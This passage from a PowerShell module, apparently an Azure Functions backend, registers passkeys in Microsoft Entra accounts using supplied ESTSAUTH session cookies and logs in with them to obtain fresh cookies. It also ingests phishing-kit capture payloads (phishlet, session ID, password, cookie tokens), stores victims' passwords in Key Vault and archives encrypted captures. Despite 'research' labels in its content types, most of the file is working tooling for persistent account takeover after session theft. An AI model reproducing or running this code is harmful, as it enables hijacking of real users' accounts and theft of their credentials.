        delaySeconds = Get-PostRegistrationLoginDelaySeconds
        note = 'Newly registered passkeys can take a few seconds before login succeeds. If you automate login immediately after registration, wait briefly and retry once.'
    }
}

function Get-RegistrationStatusBlobUri {
    param(
        [Parameter(Mandatory)]
        [string]$RequestId
    )

    $blobServiceUri = Get-StorageBlobServiceUri
    $containerName = Get-RegistrationStatusContainerName
    $blobName = [uri]::EscapeDataString("$RequestId.json")
    return "$blobServiceUri/$containerName/$blobName"
}

function Ensure-RegistrationStatusContainer {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Configuration
    )

    $statusContainerCache = Get-Variable -Name PasskeyStatusContainerEnsured -Scope Script -ErrorAction SilentlyContinue
    if ($null -eq $statusContainerCache) {
        $script:PasskeyStatusContainerEnsured = @{}
    }

    $containerName = Get-RegistrationStatusContainerName
    if ($script:PasskeyStatusContainerEnsured.ContainsKey($containerName)) {
        return
    }

    $storageToken = Get-StorageAccessToken -Configuration $Configuration
    $containerUri = "$(Get-StorageBlobServiceUri)/${containerName}?restype=container"
    $headers = @{
        Authorization = "Bearer $storageToken"
        'x-ms-version' = '2023-11-03'
        'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R')
    }

    try {
        Invoke-WebRequest -Method PUT -Uri $containerUri -Headers $headers -ContentType 'application/octet-stream' | Out-Null
    } catch {
        $statusCode = $null
        if ($_.Exception.Response) {
            $statusCode = [int]$_.Exception.Response.StatusCode
        }

        if ($statusCode -ne 409) {
            throw
        }
    }

    $script:PasskeyStatusContainerEnsured[$containerName] = $true
}

function Set-RegistrationStatus {
    param(
        [Parameter(Mandatory)]
        [string]$RequestId,

        [Parameter(Mandatory)]
        [hashtable]$Status,

        [Parameter()]
        [hashtable]$Configuration
    )

    if ($null -eq $Configuration) {
        $Configuration = Get-PasskeyFunctionConfiguration
    }
    Ensure-RegistrationStatusContainer -Configuration $Configuration

    $status.updatedAtUtc = (Get-Date).ToUniversalTime().ToString('o')
    if (-not $Status.ContainsKey('requestId') -or [string]::IsNullOrWhiteSpace([string]$Status.requestId)) {
        $status.requestId = $RequestId
    }
    if (-not $Status.ContainsKey('loginPropagation')) {
        $status.loginPropagation = Get-PostRegistrationLoginHint
    }

    $storageToken = Get-StorageAccessToken -Configuration $Configuration
    $blobUri = Get-RegistrationStatusBlobUri -RequestId $RequestId
    $body = $status | ConvertTo-Json -Depth 30
    $headers = @{
        Authorization = "Bearer $storageToken"
        'x-ms-version' = '2023-11-03'
        'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R')
        'x-ms-blob-type' = 'BlockBlob'
    }

    Invoke-WebRequest -Method PUT -Uri $blobUri -Headers $headers -ContentType 'application/json; charset=utf-8' -Body $body | Out-Null
}

function Get-RegistrationStatus {
    param(
        [Parameter(Mandatory)]
        [string]$RequestId,

        [Parameter()]
        [hashtable]$Configuration
    )

    if ($null -eq $Configuration) {
        $Configuration = Get-PasskeyFunctionConfiguration
    }
    $storageToken = Get-StorageAccessToken -Configuration $Configuration
    $blobUri = Get-RegistrationStatusBlobUri -RequestId $RequestId
    $headers = @{
        Authorization = "Bearer $storageToken"
        'x-ms-version' = '2023-11-03'
        'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R')
    }

    try {
        $response = Invoke-WebRequest -Method GET -Uri $blobUri -Headers $headers
        if ([string]::IsNullOrWhiteSpace($response.Content)) {
            return $null
        }

        return $response.Content | ConvertFrom-Json -AsHashtable -Depth 30
    } catch {
        $statusCode = $null
        if ($_.Exception.Response) {
            $statusCode = [int]$_.Exception.Response.StatusCode
        }

        if ($statusCode -eq 404) {
            return $null
        }

        throw
    }
}

function Get-RegistrationStatusUrl {
    param(
        [Parameter(Mandatory)]
        $Request,

        [Parameter(Mandatory)]
        [string]$RequestId,

        [Parameter()]
        [ValidateSet('entra', 'okta')]
        [string]$Provider = 'entra'
    )

    $relativePath = "/api/$Provider/passkeys/register/status/$RequestId"
    $code = $null
    if ($null -ne $Request.Query) {
        if ($Request.Query -is [System.Collections.IDictionary]) {
            if ($Request.Query.ContainsKey('code')) {
                $code = [string]$Request.Query['code']
            }
        } else {
            $property = $Request.Query.PSObject.Properties['code']
            if ($property) {
                $code = [string]$property.Value
            }
        }
    }

    if ($Request.Url) {
        $requestUri = if ($Request.Url -is [uri]) { $Request.Url } else { [uri][string]$Request.Url }
        $baseUrl = $requestUri.GetLeftPart([System.UriPartial]::Authority)
        $statusUrl = "$baseUrl$relativePath"
        if (-not [string]::IsNullOrWhiteSpace($code)) {
            $statusUrl += "?code=$([uri]::EscapeDataString($code))"
        }
        return $statusUrl
    }

    if (-not [string]::IsNullOrWhiteSpace($code)) {
        return "$relativePath?code=$([uri]::EscapeDataString($code))"
    }

    return $relativePath
}

function New-TempOutputPath {
    param(
        [Parameter(Mandatory)]
        [string]$UserPrincipalName,

        [Parameter(Mandatory)]
        [string]$AuthMethod
    )

    $safeUser = ($UserPrincipalName.Split('@')[0] -replace '[^0-9A-Za-z-]', '')
    if ([string]::IsNullOrWhiteSpace($safeUser)) {
        $safeUser = 'user'
    }

    $tempRoot = if (-not [string]::IsNullOrWhiteSpace($env:TEMP)) { $env:TEMP } else { [System.IO.Path]::GetTempPath() }
    return Join-Path $tempRoot "$safeUser-$AuthMethod-$(Get-Date -Format 'yyyyMMdd-HHmmss').json"
}

function Invoke-PasskeyRegistrationScript {
    param(
        [Parameter(Mandatory)]
        [string]$ScriptPath,

        [Parameter(Mandatory)]
        [hashtable]$Parameters
    )

    if (-not (Test-Path -LiteralPath $ScriptPath)) {
        throw "Script not found: $ScriptPath"
    }

    $outputPath = [string]$Parameters.OutputPath
    try {
        & $ScriptPath @Parameters | Out-Null
        if (-not (Test-Path -LiteralPath $outputPath)) {
            throw "The registration script did not create the expected output file: $outputPath"
        }

        return Get-Content -LiteralPath $outputPath -Raw | ConvertFrom-Json -AsHashtable
    } finally {
        if ($outputPath -and (Test-Path -LiteralPath $outputPath)) {
            Remove-Item -LiteralPath $outputPath -Force -ErrorAction SilentlyContinue
        }
    }
}

function Invoke-EstsAuthPasskeyRegistration {
    param(
        [Parameter(Mandatory)]
        [string]$UserPrincipalName,

        [Parameter(Mandatory)]
        [string]$EstsAuthCookie,

        [Parameter()]
        [string]$DisplayName,

        [Parameter()]
        [string]$KeyVaultKeyName,

        [Parameter()]
        [string]$UserAgent,

        [Parameter()]
        [string]$RedirectUri
    )

    $configuration = Get-PasskeyFunctionConfiguration
    $keyVaultAccessToken = Get-KeyVaultAccessToken -Configuration $configuration
    $scriptPath = Join-Path $PSScriptRoot 'passkey-assets\scripts\entra\reference\Register-EntraKeyVaultPasskeyViaEstsAuth.ps1'
    $outputPath = New-TempOutputPath -UserPrincipalName $UserPrincipalName -AuthMethod 'estsauth'

    $scriptParameters = @{
        ESTSAuthCookie = $EstsAuthCookie
        TenantId = $configuration.TenantId
        KeyVaultName = $configuration.KeyVaultName
        KeyVaultAccessToken = $keyVaultAccessToken
        OutputPath = $outputPath
    }

    if (-not [string]::IsNullOrWhiteSpace($DisplayName)) {
        $scriptParameters.PasskeyDisplayName = $DisplayName
    }

    if (-not [string]::IsNullOrWhiteSpace($KeyVaultKeyName)) {
        $scriptParameters.KeyVaultKeyName = $KeyVaultKeyName
    }

    if (-not [string]::IsNullOrWhiteSpace($UserAgent)) {
        $scriptParameters.UserAgent = (Normalize-PasskeyUserAgent -UserAgent $UserAgent)
    }

    if (-not [string]::IsNullOrWhiteSpace($RedirectUri)) {
        $scriptParameters.RedirectUri = (Normalize-PasskeyRedirectUri -RedirectUri $RedirectUri)
    }

    $credential = Invoke-PasskeyRegistrationScript -ScriptPath $scriptPath -Parameters $scriptParameters
    if ([string]::Compare([string]$credential.userName, $UserPrincipalName, $true) -ne 0) {
        throw [System.InvalidOperationException]::new("The ESTSAUTH cookie resolved to '$($credential.userName)', which does not match the requested user '$UserPrincipalName'.")
    }

    return [ordered]@{
        Configuration = $configuration
        Credential = $credential
    }
}

function Get-CredentialPayload {
    param(
        [Parameter(Mandatory)]
        [hashtable]$Body
    )

    if ($Body.ContainsKey('credential')) {
        $credential = $Body['credential']
        if ($credential -is [System.Collections.IDictionary]) {
            return [hashtable]$credential
        }

        return ($credential | ConvertTo-Json -Depth 20 | ConvertFrom-Json -AsHashtable)
    }

    $payload = [ordered]@{}
    foreach ($entry in $Body.GetEnumerator()) {
        if ($entry.Key -in @('authUrl', 'keyVaultName', 'keyVaultKeyName', 'userAgent', 'useragent', 'redirectUri', 'redirecturi')) {
            continue
        }

        $payload[$entry.Key] = $entry.Value
    }

    return [hashtable]$payload
}

function Invoke-PasskeyLoginScript {
    param(
        [Parameter(Mandatory)]
        [string]$ScriptPath,

        [Parameter(Mandatory)]
        [object]$Credential,

        [Parameter()]
        [hashtable]$Parameters = @{}
    )

    if (-not (Test-Path -LiteralPath $ScriptPath)) {
        throw "Script not found: $ScriptPath"
    }

    $userPrincipalName = [string]($Credential.userName ?? $Credential.username ?? $Credential.userPrincipalName ?? 'user')
    $credentialPath = New-TempOutputPath -UserPrincipalName $userPrincipalName -AuthMethod 'login'

    try {
        $Credential | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $credentialPath -Encoding UTF8
        Remove-Variable -Name ESTSAUTH -Scope Global -ErrorAction SilentlyContinue

        $loginParameters = @{
            KeyFilePath = $credentialPath
            PassThru    = $true
        } + $Parameters

        $result = & $ScriptPath @loginParameters
        $estsAuthCookie = $null
        $estsVariable = Get-Variable -Name ESTSAUTH -Scope Global -ErrorAction SilentlyContinue
        if ($estsVariable) {
            $estsAuthCookie = [string]$estsVariable.Value
        }

        return [ordered]@{
            Result         = $result
            ESTSAuthCookie = $estsAuthCookie
        }
    } finally {
        if (Test-Path -LiteralPath $credentialPath) {
            Remove-Item -LiteralPath $credentialPath -Force -ErrorAction SilentlyContinue
        }
    }
}

function Get-PasskeyCaptureTableName {
    $name = [Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_TABLE_NAME')
    if ([string]::IsNullOrWhiteSpace($name)) { return 'PasskeyCaptureContexts' }
    if ($name -notmatch '^[A-Za-z0-9]+$') { throw [System.ArgumentException]::new('PASSKEY_CAPTURE_TABLE_NAME must be alphanumeric.') }
    return $name
}

function Get-PasskeyCaptureContainerName {
    $name = [Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_CONTAINER_NAME')
    if ([string]::IsNullOrWhiteSpace($name)) { return 'passkey-capture-context' }
    return $name.Trim().ToLowerInvariant()
}

function Set-PasskeyKeyVaultSecret {
    param(
        [Parameter(Mandatory)][hashtable]$Configuration,
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$Value,
        [Parameter(Mandatory)][string]$ContentType,
        [Parameter()][Nullable[datetime]]$ExpiresAt,
        [Parameter()][hashtable]$Tags = @{}
    )
    $attributes = @{ enabled = $true }
    if ($null -ne $ExpiresAt) { $attributes.exp = [DateTimeOffset]::new([datetime]$ExpiresAt).ToUnixTimeSeconds() }
    $body = @{ value = $Value; contentType = $ContentType; attributes = $attributes; tags = $Tags } | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Method PUT -Uri "https://$($Configuration.KeyVaultName).vault.azure.net/secrets/$([uri]::EscapeDataString($Name))?api-version=7.4" `
        -Headers @{ Authorization = "Bearer $(Get-KeyVaultAccessToken -Configuration $Configuration)" } -ContentType 'application/json' -Body $body | Out-Null
}

function Get-PasskeyKeyVaultSecret {
    param([Parameter(Mandatory)][hashtable]$Configuration, [Parameter(Mandatory)][string]$Name)
    try {
        $result = Invoke-RestMethod -Method GET -Uri "https://$($Configuration.KeyVaultName).vault.azure.net/secrets/$([uri]::EscapeDataString($Name))?api-version=7.4" `
            -Headers @{ Authorization = "Bearer $(Get-KeyVaultAccessToken -Configuration $Configuration)" }
        return [string]$result.value
    } catch {
        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
        if ($statusCode -eq 404) { return $null }
        throw
    }
}

function Remove-PasskeyKeyVaultSecret {
    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][string]$Name)
    try {
        Invoke-RestMethod -Method DELETE -Uri "https://$($Configuration.KeyVaultName).vault.azure.net/secrets/$([uri]::EscapeDataString($Name))?api-version=7.4" -Headers @{Authorization="Bearer $(Get-KeyVaultAccessToken -Configuration $Configuration)"}|Out-Null
        return $true
    } catch {
        $statusCode=if($_.Exception.Response){[int]$_.Exception.Response.StatusCode}else{$null};if($statusCode -eq 404){return $false};throw
    }
}

function Ensure-PasskeyCaptureResources {
    param([Parameter(Mandatory)][hashtable]$Configuration)
    $tableName = Get-PasskeyCaptureTableName
    try {
        Invoke-WebRequest -Method POST -Uri "$(Get-StorageTableServiceUri)/Tables" -Headers (Get-StorageTableHeaders -Configuration $Configuration) `
            -ContentType 'application/json' -Body (@{ TableName = $tableName } | ConvertTo-Json -Compress) | Out-Null
    } catch {
        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
        if ($statusCode -ne 409) { throw }
    }
    $headers = @{ Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"; 'x-ms-version' = '2023-11-03'; 'x-ms-date' = (Get-Date).ToUniversalTime().ToString('R') }
    try {
        Invoke-WebRequest -Method PUT -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)?restype=container" -Headers $headers | Out-Null
    } catch {
        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }
        if ($statusCode -ne 409) { throw }
    }
}

function Test-PasskeyCaptureRequested {
    param([Parameter(Mandatory)][hashtable]$Body)
    foreach ($name in @('event','phishlet','session_id','sessionId','password','remote_ip','cookie_tokens','body_tokens','http_tokens','trigger')) {
        if ($Body.ContainsKey($name)) { return $true }
    }
    return $false
}

function Save-PasskeyLoginAndCaptureContext {
    param(
        [Parameter(Mandatory)][ValidateSet('entra','okta')][string]$Provider,
        [Parameter(Mandatory)][hashtable]$Body,
        [Parameter(Mandatory)][hashtable]$Credential,
        [Parameter(Mandatory)][hashtable]$Configuration,
        [Parameter()][string]$UserAgent
    )
    $record = New-PasskeyCatalogRecord -Provider $Provider -Credential $Credential
    $recordId = [string]$record.recordId
    $secretName = "pklogin-$recordId"
    $loginContext = @{}
    $existing = Get-PasskeyKeyVaultSecret -Configuration $Configuration -Name $secretName
    if (-not [string]::IsNullOrWhiteSpace($existing)) { $loginContext = $existing | ConvertFrom-Json -AsHashtable -Depth 10 }
    if ($Body.ContainsKey('password') -and -not [string]::IsNullOrWhiteSpace([string]$Body.password)) { $loginContext.password = [string]$Body.password }
    $submittedUserAgent = [string]($Body.user_agent ?? $Body.userAgent ?? '')
    if (-not [string]::IsNullOrWhiteSpace($submittedUserAgent)) { $loginContext.userAgent = $submittedUserAgent.Trim() }
    elseif (-not [string]::IsNullOrWhiteSpace($UserAgent) -and -not $loginContext.ContainsKey('userAgent')) { $loginContext.userAgent = $UserAgent }
    $extensions = @{
        loginContextSecretName = $null
        hasStoredPassword = $false
        hasStoredUserAgent = $false
    }
    if ($loginContext.ContainsKey('password') -or $loginContext.ContainsKey('userAgent')) {
        $loginContext.schemaVersion = '1'
        $loginContext.updatedAt = (Get-Date).ToUniversalTime().ToString('o')
        Set-PasskeyKeyVaultSecret -Configuration $Configuration -Name $secretName -Value ($loginContext | ConvertTo-Json -Compress) `
            -ContentType 'application/vnd.research-passkeys.login-context+json' -Tags @{ recordId = $recordId; kind = 'login-context' }
        $extensions.loginContextSecretName = $secretName
        $extensions.hasStoredPassword = $loginContext.ContainsKey('password')
        $extensions.hasStoredUserAgent = $loginContext.ContainsKey('userAgent')
    }
    if (-not (Test-PasskeyCaptureRequested -Body $Body)) { return $extensions }

    $rawJson = $Body | ConvertTo-Json -Depth 50 -Compress
    $rawBytes = [Text.Encoding]::UTF8.GetBytes($rawJson)
    $maxBytes = 1048576
    [void][int]::TryParse([Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_MAX_BYTES'), [ref]$maxBytes)
    if ($rawBytes.Length -gt $maxBytes) { throw [System.ArgumentException]::new("Capture payload exceeds the configured $maxBytes-byte limit.") }
    $sessionId = [string]($Body.session_id ?? $Body.sessionId ?? '')
    $captureId = if ($sessionId) { Get-DeterministicPasskeyRecordId -Name "passkey-capture:${Provider}:${sessionId}:$($Credential.keyVault.keyName)" } else { [guid]::NewGuid().ToString() }
    $cek = [byte[]]::new(32); [Security.Cryptography.RandomNumberGenerator]::Fill($cek)
    $nonce = [byte[]]::new(12); [Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
    $ciphertext = [byte[]]::new($rawBytes.Length); $tag = [byte[]]::new(16)
    $aad = [Text.Encoding]::UTF8.GetBytes("passkey-capture:v1:${Provider}:${captureId}")
    $aes = [Security.Cryptography.AesGcm]::new($cek, 16)
    try { $aes.Encrypt($nonce, $rawBytes, $ciphertext, $tag, $aad) } finally { $aes.Dispose() }
    $expires = (Get-Date).ToUniversalTime().AddHours(24)
    $cekSecretName = "pkcek-$captureId"
    Set-PasskeyKeyVaultSecret -Configuration $Configuration -Name $cekSecretName -Value ([Convert]::ToBase64String($cek)) `
        -ContentType 'application/vnd.research-passkeys.capture-key' -ExpiresAt $expires -Tags @{ recordId = $recordId; captureId = $captureId; kind = 'capture-key' }
    Ensure-PasskeyCaptureResources -Configuration $Configuration
    $blobName = "$recordId/$captureId.json"
    $envelope = @{ schemaVersion='1'; algorithm='A256GCM'; nonce=[Convert]::ToBase64String($nonce); ciphertext=[Convert]::ToBase64String($ciphertext); tag=[Convert]::ToBase64String($tag) } | ConvertTo-Json -Compress
    $blobHeaders = @{ Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"; 'x-ms-version'='2023-11-03'; 'x-ms-date'=(Get-Date).ToUniversalTime().ToString('R'); 'x-ms-blob-type'='BlockBlob' }
    Invoke-WebRequest -Method PUT -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)/$blobName" -Headers $blobHeaders -ContentType 'application/json' -Body $envelope | Out-Null
    $sha = [Convert]::ToHexString([Security.Cryptography.SHA256]::HashData($rawBytes)).ToLowerInvariant()
    $entity = [ordered]@{
        PartitionKey=$recordId; RowKey=$captureId; Provider=$Provider; Event=[string]($Body.event ?? ''); Phishlet=[string]($Body.phishlet ?? '');
        SessionId=$sessionId; Trigger=[string]($Body.trigger ?? ''); CapturedAt=[string]($Body.timestamp ?? (Get-Date).ToUniversalTime().ToString('o'));
        ReceivedAt=(Get-Date).ToUniversalTime().ToString('o'); ExpiresAt=$expires.ToString('o'); Status='active'; PayloadSha256=$sha;
        EncryptedBlobName=$blobName; CekSecretName=$cekSecretName
    }
    $uri = "$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)(PartitionKey='$recordId',RowKey='$captureId')"
    Invoke-WebRequest -Method PUT -Uri $uri -Headers (Get-StorageTableHeaders -Configuration $Configuration) -ContentType 'application/json' -Body ($entity | ConvertTo-Json -Compress) | Out-Null
    $extensions.latestCaptureId = $captureId
    return $extensions
}

function Get-PasskeyLoginContext {
    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][hashtable]$Record)
    if ([string]::IsNullOrWhiteSpace([string]$Record.loginContextSecretName)) { return @{} }
    $value = Get-PasskeyKeyVaultSecret -Configuration $Configuration -Name ([string]$Record.loginContextSecretName)
    if ([string]::IsNullOrWhiteSpace($value)) { return @{} }
    return $value | ConvertFrom-Json -AsHashtable -Depth 10
}

function Get-PasskeyCaptureContexts {
    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][string]$RecordId)
    Ensure-PasskeyCaptureResources -Configuration $Configuration
    $filter = [uri]::EscapeDataString("PartitionKey eq '$($RecordId.Replace("'","''"))'")
    $response = Invoke-RestMethod -Method GET -Uri "$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)()?`$filter=$filter" -Headers (Get-StorageTableHeaders -Configuration $Configuration)
    return @($response.value | ForEach-Object { $status=[string]$_.Status;if((Get-Date).ToUniversalTime() -ge [datetime]$_.ExpiresAt){$status='expired'};[ordered]@{ recordId=$_.PartitionKey; captureId=$_.RowKey; provider=$_.Provider; event=$_.Event; phishlet=$_.Phishlet; sessionId=$_.SessionId; trigger=$_.Trigger; capturedAt=$_.CapturedAt; receivedAt=$_.ReceivedAt; expiresAt=$_.ExpiresAt; status=$status; payloadSha256=$_.PayloadSha256; encryptedBlobName=$_.EncryptedBlobName; cekSecretName=$_.CekSecretName } })
}

function Export-PasskeyCapturePayload {
    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][System.Collections.IDictionary]$Context)
    if ((Get-Date).ToUniversalTime() -ge [datetime]$Context.expiresAt) { throw [TimeoutException]::new('Capture context has expired.') }
    $cek = [Convert]::FromBase64String((Get-PasskeyKeyVaultSecret -Configuration $Configuration -Name ([string]$Context.cekSecretName)))
    $headers = @{ Authorization = "Bearer $(Get-StorageAccessToken -Configuration $Configuration)"; 'x-ms-version'='2023-11-03'; 'x-ms-date'=(Get-Date).ToUniversalTime().ToString('R') }
    $envelope = Invoke-RestMethod -Method GET -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)/$($Context.encryptedBlobName)" -Headers $headers
    $nonce=[Convert]::FromBase64String($envelope.nonce); $cipher=[Convert]::FromBase64String($envelope.ciphertext); $tag=[Convert]::FromBase64String($envelope.tag)
    $plain=[byte[]]::new($cipher.Length); $aad=[Text.Encoding]::UTF8.GetBytes("passkey-capture:v1:$($Context.provider):$($Context.captureId)")
    $aes=[Security.Cryptography.AesGcm]::new($cek,16)
    try { $aes.Decrypt($nonce,$cipher,$tag,$plain,$aad) } finally { $aes.Dispose() }
    return [Text.Encoding]::UTF8.GetString($plain) | ConvertFrom-Json -AsHashtable -Depth 50
}

function Protect-PasskeyQueuedCapture {
    param([Parameter(Mandatory)][hashtable]$Configuration,[Parameter(Mandatory)][ValidateSet('entra','okta')][string]$Provider,[Parameter(Mandatory)][hashtable]$Body,[Parameter(Mandatory)][string]$RequestId)
    $raw=[Text.Encoding]::UTF8.GetBytes(($Body | ConvertTo-Json -Depth 50 -Compress)); $max=1048576
    [void][int]::TryParse([Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_MAX_BYTES'),[ref]$max)
    if($raw.Length -gt $max){throw [System.ArgumentException]::new("Capture payload exceeds the configured $max-byte limit.")}
    $captureId=Get-DeterministicPasskeyRecordId -Name "passkey-queue-capture:${Provider}:${RequestId}"
    $cek=[byte[]]::new(32);[Security.Cryptography.RandomNumberGenerator]::Fill($cek);$nonce=[byte[]]::new(12);[Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
    $cipher=[byte[]]::new($raw.Length);$tag=[byte[]]::new(16);$aad=[Text.Encoding]::UTF8.GetBytes("passkey-capture:v1:${Provider}:${captureId}")
    $aes=[Security.Cryptography.AesGcm]::new($cek,16);try{$aes.Encrypt($nonce,$raw,$cipher,$tag,$aad)}finally{$aes.Dispose()}
    $expires=(Get-Date).ToUniversalTime().AddHours(24);$secretName="pkcek-$captureId"
    Set-PasskeyKeyVaultSecret -Configuration $Configuration -Name $secretName -Value ([Convert]::ToBase64String($cek)) -ContentType 'application/vnd.research-passkeys.capture-key' -ExpiresAt $expires -Tags @{requestId=$RequestId;captureId=$captureId;kind='queued-capture-key'}
    Ensure-PasskeyCaptureResources -Configuration $Configuration;$blobName="pending/$RequestId/$captureId.json"
    $envelope=@{schemaVersion='1';algorithm='A256GCM';nonce=[Convert]::ToBase64String($nonce);ciphertext=[Convert]::ToBase64String($cipher);tag=[Convert]::ToBase64String($tag)}|ConvertTo-Json -Compress
    $headers=@{Authorization="Bearer $(Get-StorageAccessToken -Configuration $Configuration)";'x-ms-version'='2023-11-03';'x-ms-date'=(Get-Date).ToUniversalTime().ToString('R');'x-ms-blob-type'='BlockBlob'}
    Invoke-WebRequest -Method PUT -Uri "$(Get-StorageBlobServiceUri)/$(Get-PasskeyCaptureContainerName)/$blobName" -Headers $headers -ContentType 'application/json' -Body $envelope|Out-Null
    return [ordered]@{provider=$Provider;captureId=$captureId;expiresAt=$expires.ToString('o');encryptedBlobName=$blobName;cekSecretName=$secretName}
}

function Test-DevelopmentSecretExportEnabled {
    return [Environment]::GetEnvironmentVariable('PASSKEY_DEPLOYMENT_PROFILE') -eq 'development' -and [Environment]::GetEnvironmentVariable('PASSKEY_ENABLE_DEV_SECRET_EXPORT') -eq 'true'
}

function Remove-ExpiredPasskeyCaptureProvenance {
    param([Parameter(Mandatory)][hashtable]$Configuration)
    $days=90;[void][int]::TryParse([Environment]::GetEnvironmentVariable('PASSKEY_CAPTURE_PROVENANCE_DAYS'),[ref]$days);if($days -lt 1){$days=90}
    Ensure-PasskeyCaptureResources -Configuration $Configuration
    $response=Invoke-RestMethod -Method GET -Uri "$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)()" -Headers (Get-StorageTableHeaders -Configuration $Configuration)
    $cutoff=(Get-Date).ToUniversalTime().AddDays(-$days);$deleted=0
    foreach($entity in @($response.value)){
        $received=[datetime]::MinValue;if(-not [datetime]::TryParse([string]$entity.ReceivedAt,[ref]$received)){continue};if($received.ToUniversalTime() -ge $cutoff){continue}
        $uri="$(Get-StorageTableServiceUri)/$(Get-PasskeyCaptureTableName)(PartitionKey='$($entity.PartitionKey)',RowKey='$($entity.RowKey)')"
        $headers=Get-StorageTableHeaders -Configuration $Configuration;$headers['If-Match']='*'
        Invoke-WebRequest -Method DELETE -Uri $uri -Headers $headers|Out-Null;$deleted++
    }
    return $deleted
}

function New-JsonHttpResponse {
    param(
        [Parameter(Mandatory)]
        [HttpStatusCode]$StatusCode,

        [Parameter(Mandatory)]
        $Body,

        [Parameter()]
        [switch]$NoStore
    )

    $response = @{
        StatusCode = $StatusCode
        Headers = @{
            'Content-Type' = 'application/json'
        }
        Body = ($Body | ConvertTo-Json -Depth 20)
    }
    if ($NoStore) {
        $response.Headers['Cache-Control'] = 'no-store'
        $response.Headers['Pragma'] = 'no-cache'
    }

    if ('HttpResponseContext' -as [type]) {
        return [HttpResponseContext]$response
    }

    return [pscustomobject]$response
}
